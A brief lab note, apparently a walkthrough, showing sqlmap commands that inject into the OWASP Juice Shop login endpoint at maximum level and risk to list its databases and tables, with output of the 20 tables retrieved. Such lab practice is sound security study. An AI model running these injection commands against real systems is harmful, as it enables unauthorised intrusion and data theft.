# SQL Map

It's more effective when you set some default values. It increases the performance.

## Retrieve the databases

```bash
sqlmap -u 'juice-shop.herokuapp.com/rest/user/login' --data="email=test@test.com&password=test" --level 5 --risk 3 -f --banner --ignore-code 401 --dbs
```


## Retrieve the tables

```bash
sqlmap -u 'juice-shop.herokuapp.com/rest/user/login' --data="email=test@test.com&password=test" --level 5 --risk 3 -f --banner --ignore-code 401 --tables
```

Here is the result

```bash
...
[21:51:47] [INFO] retrieved: Quantities
[21:52:00] [INFO] retrieved: Recycles
[21:52:11] [INFO] retrieved: SecurityQuestions
[21:52:37] [INFO] retrieved: SecurityAnswers
[21:52:49] [INFO] retrieved: Wallets
[20 tables]
+-------------------+
| Addresses |
| BasketItems |
| Baskets |
| Captchas |
| Cards |
| Challenges |
| Complaints |
| Deliveries |
| Feedbacks |
| ImageCaptchas |
| Memories |
| PrivacyRequests |
| Products |
| Quantities |
| Recycles |
| SecurityAnswers |
| SecurityQuestions |
| Users |
| Wallets |
| sqlite_sequence |
+-------------------+
```
